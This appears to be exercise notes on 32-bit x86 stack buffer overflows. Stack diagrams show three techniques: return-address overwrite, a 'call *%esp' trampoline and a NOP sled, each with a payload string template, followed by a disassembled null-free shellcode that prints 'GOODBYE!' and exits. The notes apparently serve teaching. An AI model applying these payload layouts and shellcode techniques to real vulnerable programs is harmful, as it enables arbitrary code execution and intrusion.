[ buffer_overflow_1 ]

               +--------------------+ (higher address)
       ESP + 4 |                    |
               +--------------------+
           ESP | input              |
               +--------------------+ \
return address | goodbye()          | |
               +--------------------+ |
           EBP | 31 31 31 31        | |
               +--------------------+ | buffer overflow attack
               | 31 31 31 31        | |
               +--------------------+ |
               | 31 31 31 31        | |
               +--------------------+ /
      buf[4:7] | 31 31 31 31        |
               +--------------------+
      buf[0:3] | 31 31 31 31        |
               +--------------------+ (lower address)

               +--------------------+
               |                    |
               | ...                |
               |                    |
               +--------------------+
               | ec 18 c7 04        |
               +--------------------+
     goodbye() | 55 89 e5 83        |
               +--------------------+


Copy string "11111111111111111111\xAA\xAA\xAA\xAA" to buf[],
  where AA-AA-AA-AA is the address of goodbye().



[ buffer_overflow_2 ]

               +--------------------+ (higher address)
               |                    |
     ESP + ... | shellcode ...      |
               |                    |
               +--------------------+
       ESP + 4 | shellcode ...      |
               +--------------------+
           ESP | shellcode ...      |
               +--------------------+
return address | g_callESP          |
               +--------------------+
           EBP | 31 31 31 31        |
               +--------------------+
               | 31 31 31 31        |
               +--------------------+
               | 31 31 31 31        |
               +--------------------+
      buf[4:7] | 31 31 31 31        |
               +--------------------+
      buf[0:3] | 31 31 31 31        |
               +--------------------+ (lower address)

               +--------------------+
     g_callESP | ff d4 xx xx        | => call *%esp
               +--------------------+


Copy string "11111111111111111111\xAA\xAA\xAA\xAA\xCC\xCC\xCC\xCC..." to buf[],
  where AA-AA-AA-AA is the address of g_callESP,
  and CC-CC-CC-CC... is the shellcode.



[ buffer_overflow_3 ]

               +--------------------+ (higher address)
       ESP + 4 |                    |
               +--------------------+
           ESP | input              |
               +--------------------+
return address | &(buf[0])          | => to the begin of shellcode
               +--------------------+
           EBP | 90 90 90 90        |
               +--------------------+
               | 90 90 90 90        |
               +--------------------+
               | 90 90 90 90        |
               +--------------------+
  buf[124:127] | 90 90 90 90        |
               +--------------------+
               |                    |
      buf[...] | shellcode ...      |
               |                    |
               +--------------------+
      buf[4-7] | shellcode ...      |
               +--------------------+
      buf[0-3] | shellcode ...      |
               +--------------------+ (lower address)


Copy string "\xCC\xCC\xCC\xCC...\x90\x90\x90\x90...\xAA\xAA\xAA\xAA" to buf[],
  where CC-CC-CC-CC... is the shellcode with (128 + 12) bytes,
  and 90-90-90-90... is the NOP instructions,
  and AA-AA-AA-AA is the address of buf[].



[ shellcode ]

                            # 47 4f 4f 44 42 59 45 21 0a
                            #  G  O  O  D  B  Y  E  ! \n
   0:   b8 fa ff ff ff          mov    $0xfffffffa,%eax
   5:   83 f0 f0                xor    $0xfffffff0,%eax
   8:   50                      push   %eax
   9:   b8 42 59 45 21          mov    $0x21455942,%eax
   e:   50                      push   %eax
   f:   b8 47 4f 4f 44          mov    $0x444f4f47,%eax
  14:   50                      push   %eax
                            # sys_write:
                            #   %eax %ebx %ecx %edx
                            #    4    fd   buf  size
  15:   ba f9 ff ff ff          mov    $0xfffffff9,%edx
  1a:   83 f2 f0                xor    $0xfffffff0,%edx
  1d:   89 e1                   mov    %esp,%ecx
  1f:   bb f1 ff ff ff          mov    $0xfffffff1,%ebx
  24:   83 f3 f0                xor    $0xfffffff0,%ebx
  27:   b8 f4 ff ff ff          mov    $0xfffffff4,%eax
  2c:   83 f0 f0                xor    $0xfffffff0,%eax
  2f:   cd 80                   int    $0x80
                            # sys_exit:
                            #   %eax %ebx
                            #    1    code
  31:   bb f0 ff ff ff          mov    $0xfffffff0,%ebx
  36:   83 f3 f0                xor    $0xfffffff0,%ebx
  39:   b8 f1 ff ff ff          mov    $0xfffffff1,%eax
  3e:   83 f0 f0                xor    $0xfffffff0,%eax
  41:   cd 80                   int    $0x80


